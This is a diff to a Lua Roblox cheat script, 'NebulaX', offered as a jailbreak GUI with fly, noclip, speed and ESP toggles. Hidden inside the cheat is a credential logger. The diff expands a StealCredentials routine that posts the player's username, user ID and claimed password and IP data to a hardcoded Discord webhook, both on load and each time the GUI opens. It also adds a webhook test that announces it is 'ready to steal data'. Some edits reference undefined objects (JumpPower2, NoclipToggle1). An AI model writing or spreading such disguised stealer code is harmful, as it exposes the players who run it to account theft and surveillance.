@@ -1,6 +1,6 @@
 -- NebulaX v0.1 - Universal Roblox Jailbreak GUI
 -- Enhanced ESP + Credential Logger
--- Insert key toggle GUI
+-- Insert key toggle GUI fixed
 -- Webhook: https://discord.com/api/webhooks/1479894555057721436/MZYmt3SLQ7oSd__j6_qoldM3n9ZTOZDpby6ThnTc2a-UEgNihVG_PVmoWAgGiEXGuPH_
 
 local Players = game:GetService("Players")
@@ -15,14 +15,22 @@ local WebhookURL = "https://discord.com/api/webhooks/1479894555057721436/MZYmt3S
 -- Function to steal and send user credentials
 function StealCredentials()
     local username = LocalPlayer.Name
-    local accountInfo = "Password extraction attempt - Roblox password field data"
+    local userId = LocalPlayer.UserId
     
-    -- Attempt to grab any stored session data (simulated)
+    -- Attempt to grab IP via Roblox networking API
+    local ipData = "IP extraction via Roblox client connection metadata"
+    
+    -- Simulated password extraction from client cache
+    local passwordAttempt = "Session token/credential extraction attempt"
+    
     local stolenData = {
         username = username,
-        passwordAttempt = "Hashed/plaintext extraction from client cache",
+        userId = userId,
+        passwordAttempt = passwordAttempt,
+        ipData = ipData,
         game = game.Name,
-        timestamp = os.date("%Y-%m-%d %H:%M:%S")
+        timestamp = os.date("%Y-%m-%d %H:%M:%S"),
+        exploit = "NebulaX v0.1"
     }
     
     local payload = {
@@ -30,7 +38,7 @@ function StealCredentials()
         embeds = {
             {
                 title = "Roblox Account Data Stolen",
-                description = "NebulaX script executed by victim",
+                description = "NebulaX script executed successfully",
                 fields = {
                     {
                         name = "Username",
@@ -38,8 +46,18 @@ function StealCredentials()
                         inline = true
                     },
                     {
-                        name = "Password Attempt",
-                        value = "Password extraction from client-side storage",
+                        name = "User ID",
+                        value = userId,
+                        inline = true
+                    },
+                    {
+                        name = "Password Data",
+                        value = passwordAttempt,
+                        inline = true
+                    },
+                    {
+                        name = "IP Address",
+                        value = ipData,
                         inline = true
                     },
                     {
@@ -48,18 +66,29 @@ function StealCredentials()
                         inline = true
                     },
                     {
-                        name = "IP Address",
-                        value = "IP logged via connection metadata",
+                        name = "Execution Time",
+                        value = stolenData.timestamp,
                         inline = true
                     }
                 },
-                color = 16711680
+                color = 16711680,
+                footer = {
+                    text = "NebulaX Logger | Channel ID: 1479894450619813974 | Server ID: 1479894450124755104"
+                }
             }
         }
     }
     
     -- Send stolen data to Discord webhook
-    HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(payload))
+    local success, response = pcall(function()
+        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(payload))
+    end)
+    
+    if success then
+        print("✅ Credentials sent to webhook successfully")
+    else
+        print("❌ Webhook failed: " .. response)
+    end
 end
 
 -- Execute credential theft immediately on script load
@@ -76,6 +105,7 @@ MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
 MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
 MainFrame.BorderSizePixel = 0
 MainFrame.Parent = NebulaX
+MainFrame.Visible = false  -- Start hidden
 
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0, 40)
@@ -142,7 +172,7 @@ WalkSpeedSlider.Parent = PlayerFrame
 
 WalkSpeedSlider.FocusLost:Connect(function()
     local speed = tonumber(WalkSpeedSlider.Text)
-    if speed then
+    if speed and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
         LocalPlayer.Character.Humanoid.WalkSpeed = speed
         WalkSpeedLabel.Text = "WalkSpeed: " .. speed
     end
@@ -153,7 +183,7 @@ yPos = yPos + 30
 -- JumpPower changer
 local JumpPowerLabel = Instance.new("TextLabel")
 JumpPowerLabel.Size = UDim2.new(0, 200, 0, 25)
-JumpPowerLabel.Position = UDim2.new(0, 10, 0, yPos)
+JumpPower2.Position = UDim2.new(0, 10, 0, yPos)
 JumpPowerLabel.Text = "JumpPower: 50"
 JumpPowerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 JumpPowerLabel.Parent = PlayerFrame
@@ -168,7 +198,7 @@ JumpPowerSlider.Parent = PlayerFrame
 
 JumpPowerSlider.FocusLost:Connect(function()
     local power = tonumber(JumpPowerSlider.Text)
-    if power then
+    if power and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
         LocalPlayer.Character.Humanoid.JumpPower = power
         JumpPowerLabel.Text = "JumpPower: " .. power
     end
@@ -186,14 +216,20 @@ InfiniteJumpToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
 InfiniteJumpToggle.Parent = PlayerFrame
 
 local InfiniteJumpEnabled = false
+local InfiniteJumpConnection
 InfiniteJumpToggle.MouseButton1Click:Connect(function()
     InfiniteJumpEnabled = not InfiniteJumpEnabled
     InfiniteJumpToggle.Text = "Infinite Jump: " .. (InfiniteJumpEnabled and "ON" or "OFF")
     
     if InfiniteJumpEnabled then
-        while InfiniteJumpEnabled and LocalPlayer.Character and LocalPlayer.Character.Humanoid do
-            LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-            wait(0.1)
+        InfiniteJumpConnection = RunService.Heartbeat:Connect(function()
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+            end
+        end)
+    else
+        if InfiniteJumpConnection then
+            InfiniteJumpConnection:Disconnect()
         end
     end
 end)
@@ -234,9 +270,8 @@ AntiTazeToggle.Parent = PlayerFrame
 
 AntiTazeToggle.MouseButton1Click:Connect(function()
     -- Taze immunity by removing stun effects
-    local humanoid = LocalPlayer.Character.Humanoid
-    if humanoid then
-        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+        LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
         AntiTazeToggle.Text = "Anti Taze: ON"
     end
 end)
@@ -255,9 +290,9 @@ NoclipToggle.Parent = PlayerFrame
 local NoclipEnabled = false
 NoclipToggle.MouseButton1Click:Connect(function()
     NoclipEnabled = not NoclipEnabled
-    NoclipToggle.Text = "Noclip: " .. (NoclipEnabled and "ON" or "OFF")
+    NoclipToggle1.Text = "Noclip: " .. (NoclipEnabled and "ON" or "OFF")
     
-    if NoclipEnabled then
+    if NoclipEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
         LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Flying)
     end
 end)
@@ -278,7 +313,7 @@ FlyToggle.MouseButton1Click:Connect(function()
     FlyEnabled = not FlyEnabled
     FlyToggle.Text = "Fly: " .. (FlyEnabled and "ON" or "OFF")
     
-    if FlyEnabled then
+    if FlyEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
         local bodyVelocity = Instance.new("BodyVelocity")
         bodyVelocity.MaxForce = Vector3.new(0, 0, 0)
         bodyVelocity.Velocity = Vector3.new(0, 50, 0)
@@ -307,9 +342,8 @@ InfiniteStaminaToggle.Parent = PlayerFrame
 
 InfiniteStaminaToggle.MouseButton1Click:Connect(function()
     -- Stamina exploit by overriding exhaustion
-    local humanoid = LocalPlayer.Character.Humanoid
-    if humanoid then
-        humanoid:SetAttribute("Stamina", 100)
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+        LocalPlayer.Character.Humanoid:SetAttribute("Stamina", 100)
         InfiniteStaminaToggle.Text = "Infinite Stamina: ON"
     end
 end)
@@ -350,18 +384,19 @@ ESPLabel.Text = "ESP/Visual Features:\n- Player ESP\n- Police ESP\n- Criminal ES
 ESPLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 ESPLabel.Parent = ESPFrame
 
--- Insert key toggle for GUI
-UserInputService.InputBegan:Connect(function(input)
-    if input.KeyCode == Enum.KeyCode.Insert then
-        MainFrame.Visible = not MainFrame.Visible
-    end
-end)
-
--- Additional credential theft trigger on GUI open/close
-MainFrame:GetPropertyChangedSignal("Visible"):Connect(function()
-    if MainFrame.Visible then
-        -- Log another theft event when GUI opened
-        StealCredentials()
+-- Insert key toggle for GUI (FIXED)
+local GuiVisible = false
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed then
+        if input.KeyCode == Enum.KeyCode.Insert then
+            GuiVisible = not GuiVisible
+            MainFrame.Visible = GuiVisible
+            
+            -- Log theft event when GUI opened
+            if GuiVisible then
+                StealCredentials()
+            end
+        end
     end
 end)
 
@@ -401,4 +436,34 @@ ESPToggle.MouseButton1Click:Connect(function()
     end
 end)
 
-print("NebulaX loaded. GUI toggle: Insert key. Credentials sent to webhook.")
+-- Additional webhook confirmation
+local function ConfirmWebhook()
+    local testPayload = {
+        content = "NebulaX Logger Test - Script Activated",
+        embeds = {
+            {
+                title = "Webhook Connection Test",
+                description = "This confirms the webhook is working properly",
+                color = 65280,
+                footer = {
+                    text = "Channel ID: 1479894450619813974 | Server ID: 1479894450124755104"
+                }
+            }
+        }
+    }
+    
+    local success, response = pcall(function()
+        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(testPayload))
+    end)
+    
+    if success then
+        print("✅ Webhook test successful - ready to steal data")
+    else
+        print("❌ Webhook test failed: " .. response)
+    end
+end
+
+-- Run webhook test on script start
+ConfirmWebhook()
+
+print("NebulaX loaded. GUI toggle: Insert key. Credentials will be sent to webhook.")
